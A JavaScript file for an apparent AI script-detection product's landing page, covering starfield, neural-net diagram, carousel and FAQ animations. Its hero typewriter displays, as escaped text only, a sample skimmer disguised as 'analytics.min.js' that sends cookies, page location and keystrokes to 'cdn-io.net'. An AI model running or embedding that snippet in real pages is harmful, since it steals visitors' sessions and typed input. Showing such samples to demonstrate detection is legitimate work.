/* ═══════════════════════════════════════════════════════
   JSTD.AI — Main Script
   Starfield · Neural Net Diagram · Typewriter · Carousel
   Counters · Entropy Bars · Intersection Animations
══════════════════════════════════════════════════════ */

'use strict';

/* ── UTILS ─────────────────────────────────────── */
const qs = (s, r = document) => r.querySelector(s);
const qsa = (s, r = document) => [...r.querySelectorAll(s)];
const raf = requestAnimationFrame;

/* ══════════════════════════════════════════════════
   1. STARFIELD
══════════════════════════════════════════════════ */
(function initStarfield() {
    const canvas = qs('#starfield');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');

    let W, H, stars = [];

    const STAR_COUNT = 220;
    const NEBULA_COLORS = [
        'rgba(0,212,255,',
        'rgba(167,139,250,',
        'rgba(0,255,136,',
        'rgba(255,51,102,',
    ];

    function resize() {
        const DPR = window.devicePixelRatio || 1;
        W = window.innerWidth;
        H = window.innerHeight;
        canvas.style.width  = W + 'px';
        canvas.style.height = H + 'px';
        canvas.width  = Math.round(W * DPR);
        canvas.height = Math.round(H * DPR);
        ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
    }

    function createStar() {
        return {
            x: Math.random() * W,
            y: Math.random() * H,
            r: Math.random() * 1.2 + 0.2,
            alpha: Math.random() * 0.7 + 0.1,
            speed: Math.random() * 0.12 + 0.02,
            twinkle: Math.random() * Math.PI * 2,
            twinkleSpeed: 0.005 + Math.random() * 0.012,
        };
    }

    let nebulaBlobs = [];

    function initBlobs() {
        nebulaBlobs = Array.from({ length: 4 }, (_, i) => ({
            x: Math.random() * W,
            y: Math.random() * H,
            r: 180 + Math.random() * 220,
            color: NEBULA_COLORS[i % NEBULA_COLORS.length],
            alpha: 0.018 + Math.random() * 0.024,
        }));
        cacheGradients();
    }

    function cacheGradients() {
        nebulaBlobs.forEach(b => {
            const g = ctx.createRadialGradient(b.x, b.y, 0, b.x, b.y, b.r);
            g.addColorStop(0, b.color + b.alpha + ')');
            g.addColorStop(0.5, b.color + (b.alpha * 0.4) + ')');
            g.addColorStop(1, b.color + '0)');
            b.cachedGrad = g;
        });
    }

    function init() {
        resize();
        stars = Array.from({ length: STAR_COUNT }, createStar);
        initBlobs();
    }

    function draw(ts = 0) {
        if (document.hidden) return;
        ctx.clearRect(0, 0, W, H);

        // nebula blobs (gradients pre-cached in init)
        nebulaBlobs.forEach(b => {
            ctx.fillStyle = b.cachedGrad;
            ctx.beginPath();
            ctx.arc(b.x, b.y, b.r, 0, Math.PI * 2);
            ctx.fill();
        });

        // stars
        stars.forEach(s => {
            s.twinkle += s.twinkleSpeed;
            const a = s.alpha * (0.6 + 0.4 * Math.sin(s.twinkle));
            s.y -= s.speed;
            if (s.y < -2) {
                s.y = H + 2;
                s.x = Math.random() * W;
            }

            ctx.beginPath();
            ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(200,220,255,${a})`;
            ctx.fill();
        });

        // grid scanline
        const scanY = (ts * 0.04) % H;
        const scanGrad = ctx.createLinearGradient(0, scanY - 80, 0, scanY + 80);
        scanGrad.addColorStop(0, 'transparent');
        scanGrad.addColorStop(0.5, 'rgba(0,212,255,0.012)');
        scanGrad.addColorStop(1, 'transparent');
        ctx.fillStyle = scanGrad;
        ctx.fillRect(0, scanY - 80, W, 160);

        raf(draw);
    }

    init();
    draw();
    let resizeTimer;
    window.addEventListener('resize', () => {
        clearTimeout(resizeTimer);
        resizeTimer = setTimeout(() => { resize(); cacheGradients(); }, 150);
    });
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden) raf(draw);
    });
})();


/* ══════════════════════════════════════════════════
   2. CRACK LINE — inject .crack-line span into .cracked-word
══════════════════════════════════════════════════ */
qsa('.cracked-word').forEach(el => {
    const line = document.createElement('span');
    line.className = 'crack-line';
    el.appendChild(line);
});


/* ══════════════════════════════════════════════════
   3. HERO CODE TYPEWRITER
══════════════════════════════════════════════════ */
(function initTypewriter() {
    const el = qs('#heroCode');
    if (!el) return;

    const card    = el.closest('.threat-card');
    const codeArea = el;

    /* Lock only the CODE AREA height so typewriter never reflows the card */
    requestAnimationFrame(() => requestAnimationFrame(() => {
        if (codeArea && !codeArea.style.height) {
            codeArea.style.height = codeArea.offsetHeight + 'px';
        }
    }));

    /* — Threat level system — */
    const labelEl = qs('#heroThreatLabel');

    function hexToRgba(hex, a) {
        const r = parseInt(hex.slice(1,3),16), g = parseInt(hex.slice(3,5),16), b = parseInt(hex.slice(5,7),16);
        return `rgba(${r},${g},${b},${a})`;
    }

    const LEVELS = {
        safe:     { label: 'SAFE',            color: '#4ade80' },
        low:      { label: 'LOW RISK',        color: '#a3e635' },
        medium:   { label: 'MEDIUM RISK',     color: '#facc15' },
        high:     { label: 'HIGH RISK',       color: '#fb923c' },
        critical: { label: 'CRITICAL THREAT', color: '#f87171' },
    };

    const BAR_GRAD = {
        safe:     'linear-gradient(90deg,#4ade80,#22c55e)',
        low:      'linear-gradient(90deg,#a3e635,#65a30d)',
        medium:   'linear-gradient(90deg,#facc15,#d97706)',
        high:     'linear-gradient(90deg,#fb923c,#dc2626)',
        critical: 'linear-gradient(90deg,#f87171,#fb923c)',
    };

    const LABEL_GLITCH = '!@#%^&*<>[]{}|~/?=+-_.:;';

    function scrambleLabel(newText, newColor) {
        if (!labelEl) return;
        /* Start color transition immediately — it runs in parallel with the scramble */
        labelEl.style.color = newColor;
        const target = newText.split('');
        let work = labelEl.textContent.padEnd(target.length, ' ').slice(0, target.length).split('');
        let frame = 0;
        const total = target.length;
        const framesPerChar = 2;

        function rnd() { return LABEL_GLITCH[Math.floor(Math.random() * LABEL_GLITCH.length)]; }

        function step() {
            const charsDone = Math.floor(frame / framesPerChar);
            for (let i = 0; i < total; i++) {
                if (i < charsDone) {
                    work[i] = target[i];
                } else {
                    work[i] = target[i] === ' ' ? ' ' : rnd();
                }
            }
            labelEl.textContent = work.join('');
            frame++;
            if (charsDone < total) {
                setTimeout(step, 28);
            } else {
                labelEl.textContent = newText;
            }
        }
        step();
    }

    function setLevel(name) {
        const { label, color } = LEVELS[name];
        if (card) {
            card.style.transition    = 'border-color 1.6s ease, box-shadow 1.6s ease';
            card.style.borderColor   = hexToRgba(color, 0.28);
            card.style.boxShadow     = `0 0 40px ${hexToRgba(color, 0.07)}, 0 0 0 1px ${hexToRgba(color, 0.1)} inset`;
        }
        if (codeArea) codeArea.style.borderLeftColor = hexToRgba(color, 0.28);
        if (scoreEl)  scoreEl.style.color = color;
        if (barFillEl) { barFillEl.style.background = BAR_GRAD[name]; barFillEl.style.boxShadow = `0 0 8px ${hexToRgba(color, 0.45)}`; }
        if (card) card.querySelectorAll('.threat-card__header svg path').forEach(p => p.setAttribute('stroke', color));
        scrambleLabel(label, color);
    }

    const lines = [
        { txt: '// analytics.min.js v2.3.1',     cls: 'c-comment' },
        { txt: '(function(w, d) {',              cls: 'c-kw' },
        { txt: '  var _orig = d.createElement;', cls: null },
        { txt: "  d['createElement'] = (tag) => {", cls: 'c-kw' },
        { txt: "    if (tag === 'script') {",    cls: null },
        { txt: '      var xhr = new XMLHttpRequest();', cls: 'c-fn' },
        { txt: "      xhr.open('POST','//cdn-io.net/t',!0);", cls: 'c-fn' },
        { txt: "      xhr.send(btoa(d.cookie+location));", cls: 'c-str' },
        { txt: '    }; return _orig.call(d,tag); };', cls: null },
        { txt: "  d.addEventListener('keydown',", cls: 'c-kw' },
        { txt: '    e => navigator.sendBeacon(', cls: 'c-fn' },
        { txt: "      '//cdn-io.net/k', e.key));", cls: 'c-str' },
        { txt: '})(window, document);',          cls: null },
    ];

    /* Detection UI elements */
    const scoreEl    = qs('#heroScore');
    const barFillEl  = qs('#heroBarFill');
    const ruleEls    = [0,1,2,3].map(i => qs('#heroRule'    + i));
    const rulePctEls = [0,1,2,3].map(i => qs('#heroRulePct' + i));

    function animateNum(el, target, decimals, suffix, duration) {
        if (!el) return;
        const start = parseFloat(el.textContent) || 0;
        const t0 = performance.now();
        function step(now) {
            const p = Math.min((now - t0) / duration, 1);
            const ease = 1 - Math.pow(1 - p, 3);
            el.textContent = (start + (target - start) * ease).toFixed(decimals) + suffix;
            if (p < 1) requestAnimationFrame(step);
        }
        requestAnimationFrame(step);
    }

    function showRule(i, pct) {
        if (ruleEls[i] && !ruleEls[i].classList.contains('rule-visible'))
            ruleEls[i].classList.add('rule-visible');
        animateNum(rulePctEls[i], pct, 0, '%', 700);
    }

    function animateBar(target) {
        if (!barFillEl) return;
        barFillEl.style.transition = 'width 1.1s cubic-bezier(.4,0,.2,1)';
        barFillEl.style.width = target + '%';
    }

    /* Milestones fire after the line at that index finishes typing */
    const MILESTONES = {
        1:  {                    score:  9.2, bar:  6 },
        2:  { level: 'low',      score: 17.4, bar: 12 },
        3:  { level: 'medium',   score: 34.8, bar: 24, rules: [{i:0, pct:34}] },
        4:  {                    score: 44.1, bar: 33 },
        6:  { level: 'high',     score: 58.7, bar: 46, rules: [{i:0, pct:59}, {i:1, pct:28}] },
        7:  {                    score: 71.3, bar: 63, rules: [{i:1, pct:62}] },
        8:  { level: 'critical', score: 77.6, bar: 72 },
        9:  {                    score: 81.2, bar: 75, rules: [{i:2, pct:24}] },
        11: {                    score: 88.9, bar: 82, rules: [{i:2, pct:71}, {i:3, pct:38}] },
        12: {                    score: 93.46, bar: 93.46, rules: [{i:0, pct:96}, {i:1, pct:94}, {i:2, pct:88}, {i:3, pct:76}] },
    };

    function fireMilestone(idx) {
        const m = MILESTONES[idx];
        if (!m) return;
        if (m.level) setLevel(m.level);
        animateNum(scoreEl, m.score, 2, '%', 900);
        if (m.rules) m.rules.forEach(r => showRule(r.i, r.pct));
        if (m.bar != null) animateBar(m.bar);
    }

    function resetDetection() {
        setLevel('safe');
        if (scoreEl)   scoreEl.textContent = '0.00%';
        if (barFillEl) { barFillEl.style.transition = 'none'; barFillEl.style.width = '0%'; }
        ruleEls.forEach((el, i) => {
            if (!el) return;
            el.classList.remove('rule-visible');
            if (rulePctEls[i]) rulePctEls[i].textContent = '0%';
        });
    }

    let lineIdx = 0,
        charIdx = 0;
    let fullText = '';

    /* ASCII-only glitch chars — same byte-width so lines never stretch */
    const GLITCH = '!@#%^&*<>[]{}|~/?=+-_.:;';

    function scrambleOut(callback) {
        /* Strip HTML to plain char grid */
        const raw = el.textContent.replace(/▌/g, '');
        const rows = raw.split('\n');
        const grid = rows.map(r => r.split(''));

        /* Collect all non-space char positions */
        const positions = [];
        grid.forEach((row, r) => row.forEach((ch, c) => {
            if (ch.trim()) positions.push([r, c]);
        }));
        /* Shuffle for random corruption order */
        for (let i = positions.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [positions[i], positions[j]] = [positions[j], positions[i]];
        }

        function rndGlyph() { return GLITCH[Math.floor(Math.random() * GLITCH.length)]; }
        function render() { el.textContent = grid.map(r => r.join('')).join('\n'); }

        let idx = 0;
        const batch = Math.max(2, Math.ceil(positions.length / 18));

        function step() {
            /* Corrupt next batch */
            for (let b = 0; b < batch && idx < positions.length; b++, idx++) {
                const [r, c] = positions[idx];
                grid[r][c] = rndGlyph();
            }
            /* Keep already-corrupted chars alive / mutating */
            positions.slice(0, idx).forEach(([r, c]) => {
                if (Math.random() < 0.25) grid[r][c] = rndGlyph();
            });
            render();

            if (idx < positions.length) {
                setTimeout(step, 28);
            } else {
                /* Full noise — flash a few more frames then fade out */
                let flashes = 0;
                const flash = setInterval(() => {
                    positions.forEach(([r, c]) => { grid[r][c] = rndGlyph(); });
                    render();
                    if (++flashes >= 5) {
                        clearInterval(flash);
                        el.style.transition = 'opacity .3s ease';
                        el.style.opacity = '0';
                        setTimeout(callback, 320);
                    }
                }, 50);
            }
        }
        step();
    }

    function tick() {
        if (lineIdx >= lines.length) {
            setTimeout(() => {
                scrambleOut(() => {
                    el.innerHTML = '';
                    el.style.opacity = '0';
                    fullText = '';
                    lineIdx = 0;
                    charIdx = 0;
                    resetDetection();
                    el.style.transition = 'opacity .35s ease';
                    requestAnimationFrame(() => requestAnimationFrame(() => { el.style.opacity = '1'; }));
                    tick();
                });
            }, 2800);
            return;
        }

        const line = lines[lineIdx];
        if (charIdx <= line.txt.length) {
            const partial = line.txt.slice(0, charIdx);
            const cls = line.cls ? ` class="${line.cls}"` : '';
            const lineHtml = cls ?
                `<span${cls}>${escHtml(partial)}<span class="cursor">▌</span></span>` :
                escHtml(partial) + '<span class="cursor">▌</span>';

            el.innerHTML = fullText + lineHtml;
            charIdx++;
            setTimeout(tick, 32 + Math.random() * 28);
        } else {
            const cls = line.cls ? ` class="${line.cls}"` : '';
            fullText += cls ?
                `<span${cls}>${escHtml(line.txt)}</span>\n` :
                escHtml(line.txt) + '\n';
            fireMilestone(lineIdx);
            lineIdx++;
            charIdx = 0;
            setTimeout(tick, 80);
        }
    }

    function escHtml(s) {
        return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    }

    setLevel('safe');
    setTimeout(tick, 600);
})();


/* ══════════════════════════════════════════════════
   4. NEURAL NETWORK CANVAS DIAGRAM
══════════════════════════════════════════════════ */
(function initNNDiagram() {
    const c1 = qs('#nnCanvas');
    const c2 = qs('#nnCanvas2');
    if (!c1 || !c2) return;

    const DPR = Math.min((window.devicePixelRatio || 1) * 4, 8);

    /* Scale a canvas to physical pixels, keep CSS size unchanged */
    function scaleCanvas(c) {
        const lw = c.width, lh = c.height;
        c.style.width  = lw + 'px';
        c.style.height = lh + 'px';
        c.width  = Math.round(lw * DPR);
        c.height = Math.round(lh * DPR);
        return { lw, lh };
    }

    const LAYERS = [
        {
            canvas: c1, ...scaleCanvas(c1),
            left:  { n: 8, color: '#00d4ff' },
            right: { n: 8, color: '#a78bfa' },
            connColor:  'rgba(0,212,255,0.06)',
            activeConn: 'rgba(0,212,255,0.35)',
        },
        {
            canvas: c2, ...scaleCanvas(c2),
            left:  { n: 6, color: '#a78bfa' },
            right: { n: 1, color: '#00ff88' },
            connColor:  'rgba(167,139,250,0.1)',
            activeConn: 'rgba(0,255,136,0.6)',
        },
    ];

    /* Pre-compute node y-positions so they aren't recalculated every frame */
    const PAD = 32;
    const NODE_R = 6;

    function buildPositions(n, H) {
        const spacing = (H - PAD * 2) / (n + 1);
        return Array.from({ length: n }, (_, i) => PAD + spacing * (i + 1));
    }

    LAYERS.forEach(L => {
        L.leftX  = PAD + NODE_R + 2;
        L.rightX = L.lw - PAD - NODE_R - 2;
        L.leftY  = buildPositions(L.left.n,  L.lh);
        L.rightY = buildPositions(L.right.n, L.lh);
    });

    /* Draw one layer for a given animation tick */
    function drawLayer(L, tick) {
        const { canvas, lw, lh, left, right, connColor, activeConn,
                leftX, rightX, leftY, rightY } = L;
        const ctx = canvas.getContext('2d');

        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.save();
        ctx.scale(DPR, DPR);

        /* — connections, batched by style to minimise state changes — */
        ctx.lineWidth = 0.8;
        ctx.strokeStyle = connColor;
        ctx.beginPath();
        for (let i = 0; i < left.n; i++) {
            for (let j = 0; j < right.n; j++) {
                if ((i + j) % 3 !== tick) {
                    ctx.moveTo(leftX + NODE_R, leftY[i]);
                    ctx.lineTo(rightX - NODE_R, rightY[j]);
                }
            }
        }
        ctx.stroke();

        ctx.lineWidth = 1.2;
        ctx.strokeStyle = activeConn;
        ctx.beginPath();
        for (let i = 0; i < left.n; i++) {
            for (let j = 0; j < right.n; j++) {
                if ((i + j) % 3 === tick) {
                    ctx.moveTo(leftX + NODE_R, leftY[i]);
                    ctx.lineTo(rightX - NODE_R, rightY[j]);
                }
            }
        }
        ctx.stroke();

        /* — nodes — */
        function drawNodes(xs, ys, color) {
            ctx.strokeStyle = color;
            ctx.lineWidth = 1.2;
            ys.forEach(y => {
                ctx.beginPath();
                ctx.arc(xs, y, NODE_R, 0, Math.PI * 2);
                ctx.fillStyle = color + '22';
                ctx.fill();
                ctx.stroke();
            });
        }
        drawNodes(leftX,  leftY,  left.color);
        drawNodes(rightX, rightY, right.color);

        ctx.restore();
    }

    /* Shared animation loop for both canvases */
    function frame() {
        if (document.hidden) return;
        const tick = Math.floor(Date.now() / 400) % 3;
        LAYERS.forEach(L => drawLayer(L, tick));
        raf(frame);
    }

    document.addEventListener('visibilitychange', () => {
        if (!document.hidden) raf(frame);
    });

    frame();
})();


/* ══════════════════════════════════════════════════
   5. INTERSECTION OBSERVER — fade-in + trigger anims
══════════════════════════════════════════════════ */
(function initObserver() {
    const fadeEls = qsa([
        '.section__label',
        '.section__title',
        '.section__desc',
        '.pipeline__step',
        '.algo-card',
        '.tcard',
        '.showcase-item',
        '.docs-card',
        '.docs-qs-step',
    ].join(','));

    const fadeObs = new IntersectionObserver((entries) => {
        entries.forEach(e => {
            if (e.isIntersecting) {
                e.target.classList.add('is-visible');
                fadeObs.unobserve(e.target);
            }
        });
    }, { threshold: 0.12 });

    fadeEls.forEach(el => fadeObs.observe(el));

    // Trigger entropy bar animation on view
    const entropyObs = new IntersectionObserver((entries) => {
        entries.forEach(e => {
            if (e.isIntersecting) {
                qsa('.entropy-fill', e.target).forEach(bar => {
                    const target = bar.style.width;
                    bar.style.width = '0';
                    requestAnimationFrame(() => {
                        requestAnimationFrame(() => { bar.style.width = target; });
                    });
                });
                entropyObs.unobserve(e.target);
            }
        });
    }, { threshold: 0.2 });

    const entropySection = qs('.entropy-visual');
    if (entropySection) entropyObs.observe(entropySection.closest('.algo-card'));

    // Threat card bar
    const barFill = qs('.threat-card__bar-fill');
    if (barFill) {
        const barObs = new IntersectionObserver(entries => {
            entries.forEach(e => {
                if (e.isIntersecting) {
                    barFill.style.width = barFill.dataset.width || barFill.style.width;
                    barObs.unobserve(e.target);
                }
            });
        }, { threshold: 0.5 });
        barObs.observe(barFill.closest('.threat-card') || document.body);
    }
})();


/* ══════════════════════════════════════════════════
   6. ANIMATED STAT COUNTERS
══════════════════════════════════════════════════ */
(function initCounters() {
    const counters = qsa('[data-count]');
    if (!counters.length) return;

    const obs = new IntersectionObserver(entries => {
        entries.forEach(e => {
            if (!e.isIntersecting) return;
            const el = e.target;
            const target = parseFloat(el.dataset.count);
            const isFloat = String(target).includes('.');
            const duration = 1400;
            const start = performance.now();

            function step(now) {
                const progress = Math.min((now - start) / duration, 1);
                const ease = 1 - Math.pow(1 - progress, 3);
                const val = target * ease;
                el.textContent = isFloat ? val.toFixed(1) : Math.round(val).toLocaleString('ru');
                if (progress < 1) raf(step);
            }

            raf(step);
            obs.unobserve(el);
        });
    }, { threshold: 0.5 });

    counters.forEach(c => obs.observe(c));
})();


/* ══════════════════════════════════════════════════
   7. TESTIMONIALS CAROUSEL
══════════════════════════════════════════════════ */
(function initTestimonials() {
    const wrapper = qs('.testimonials');
    const track = qs('#testimonialsTrack');
    const prevBtn = qs('#tPrev');
    const nextBtn = qs('#tNext');
    const dotsWrap = qs('#tDots');
    if (!track || !wrapper) return;

    const cards = qsa('.tcard', track);
    let current = 0;
    let autoTimer;

    // Breakpoints based on actual wrapper width, not window.innerWidth —
    // so it works correctly inside iframes and any container context.
    function getPerView(wrapW) {
        if (wrapW <= 600) return 1;
        if (wrapW <= 960) return 2;
        return 3;
    }

    function applyCardSizes() {
        const wrapW = wrapper.offsetWidth;
        const pv = getPerView(wrapW);
        const gap = 24;
        const cardW = Math.floor((wrapW - gap * (pv - 1)) / pv);
        cards.forEach(c => {
            c.style.width = cardW + 'px';
            c.style.minWidth = cardW + 'px';
        });
        return { cardW, gap, pv, wrapW };
    }

    function getTotal() {
        const wrapW = wrapper.offsetWidth;
        return Math.ceil(cards.length / getPerView(wrapW));
    }

    function buildDots() {
        if (!dotsWrap) return;
        dotsWrap.innerHTML = '';
        const total = getTotal();
        for (let i = 0; i < total; i++) {
            const d = document.createElement('button');
            d.className = 't-dot' + (i === current ? ' active' : '');
            d.setAttribute('aria-label', 'Слайд ' + (i + 1));
            d.addEventListener('click', () => goTo(i));
            dotsWrap.appendChild(d);
        }
    }

    function goTo(idx) {
        const { cardW, gap, pv } = applyCardSizes();
        const total = getTotal();
        current = Math.max(0, Math.min(idx, total - 1));
        const offset = current * pv * (cardW + gap);
        track.style.transition = 'transform .5s cubic-bezier(.4,0,.2,1)';
        track.style.transform = `translateX(-${offset}px)`;
        qsa('.t-dot', dotsWrap).forEach((d, i) => d.classList.toggle('active', i === current));
    }

    function next() { goTo(current + 1 < getTotal() ? current + 1 : 0); }

    function prev() { goTo(current - 1 >= 0 ? current - 1 : getTotal() - 1); }

    function startAuto() { autoTimer = setInterval(next, 5000); }

    function stopAuto() { clearInterval(autoTimer); }

    if (nextBtn) nextBtn.addEventListener('click', () => {
        stopAuto();
        next();
        startAuto();
    });
    if (prevBtn) prevBtn.addEventListener('click', () => {
        stopAuto();
        prev();
        startAuto();
    });

    // pause autoplay while cursor is over any tcard
    track.addEventListener('mouseenter', stopAuto);
    track.addEventListener('mouseleave', startAuto);

    // swipe
    let startX = 0;
    track.addEventListener('pointerdown', e => { startX = e.clientX; });
    track.addEventListener('pointerup', e => {
        const dx = e.clientX - startX;
        if (Math.abs(dx) > 40) {
            stopAuto();
            dx < 0 ? next() : prev();
            startAuto();
        }
    });

    // keyboard
    document.addEventListener('keydown', e => {
        if (e.key === 'ArrowRight') {
            stopAuto();
            next();
            startAuto();
        }
        if (e.key === 'ArrowLeft') {
            stopAuto();
            prev();
            startAuto();
        }
    });

    window.addEventListener('resize', () => {
        applyCardSizes();
        buildDots();
        goTo(0);
    });

    applyCardSizes();
    buildDots();
    goTo(0);
    startAuto();
})();


/* ══════════════════════════════════════════════════
   8. NAV MOBILE BURGER
══════════════════════════════════════════════════ */
(function initBurger() {
    const burger = qs('#navBurger');
    const links = qs('.nav__links');
    if (!burger || !links) return;

    burger.addEventListener('click', () => {
        const open = links.style.display === 'flex';
        links.style.display = open ? '' : 'flex';
        links.style.flexDirection = 'column';
        links.style.position = 'absolute';
        links.style.top = '64px';
        links.style.left = '0';
        links.style.right = '0';
        links.style.background = 'rgba(6,9,17,.97)';
        links.style.borderBottom = '1px solid rgba(0,212,255,.14)';
        links.style.padding = '16px 32px';
        if (open) links.removeAttribute('style');
    });
})();


/* ══════════════════════════════════════════════════
   9. NAV ACTIVE LINK ON SCROLL
══════════════════════════════════════════════════ */
(function initNavHighlight() {
    const sections = qsa('section[id]');
    const navLinks = qsa('.nav__links a[href^="#"]');

    const obs = new IntersectionObserver(entries => {
        entries.forEach(e => {
            if (!e.isIntersecting) return;
            navLinks.forEach(a => {
                a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id);
            });
        });
    }, { rootMargin: '-40% 0px -55% 0px' });

    sections.forEach(s => obs.observe(s));
})();





/* ══════════════════════════════════════════════════
   11. SMOOTH PARALLAX on hero grid overlay
══════════════════════════════════════════════════ */
(function initParallax() {
    const overlay = qs('.hero__grid-overlay');
    if (!overlay || window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;

    document.addEventListener('mousemove', e => {
        const dx = (e.clientX / window.innerWidth - 0.5) * 12;
        const dy = (e.clientY / window.innerHeight - 0.5) * 8;
        overlay.style.transform = `translate(${dx}px, ${dy}px)`;
    });
})();


/* ══════════════════════════════════════════════════
   12. FEATURE BARS RESET+ANIMATE on view
══════════════════════════════════════════════════ */
(function initFeatureBars() {
    const section = qs('.features-visual');
    if (!section) return;

    const obs = new IntersectionObserver(entries => {
        entries.forEach(e => {
            if (!e.isIntersecting) return;
            qsa('.feat-bar__fill', e.target).forEach(bar => {
                bar.style.animation = 'none';
                void bar.offsetWidth;
                bar.style.animation = '';
            });
            obs.unobserve(e.target);
        });
    }, { threshold: 0.3 });

    obs.observe(section.closest('.algo-card'));
})();


/* ══════════════════════════════════════════════════
   13. FAQ ACCORDION
══════════════════════════════════════════════════ */
(function initFAQ() {
    const list = qs('#faqList');
    if (!list) return;

    list.addEventListener('click', e => {
        const btn = e.target.closest('.faq-item__q');
        if (!btn) return;

        const item = btn.closest('.faq-item');
        const isOpen = item.classList.contains('faq-item--open');

        // close all
        qsa('.faq-item--open', list).forEach(el => {
            el.classList.remove('faq-item--open');
            el.querySelector('.faq-item__q').setAttribute('aria-expanded', 'false');
        });

        // open clicked if it was closed
        if (!isOpen) {
            item.classList.add('faq-item--open');
            btn.setAttribute('aria-expanded', 'true');
        }
    });
})();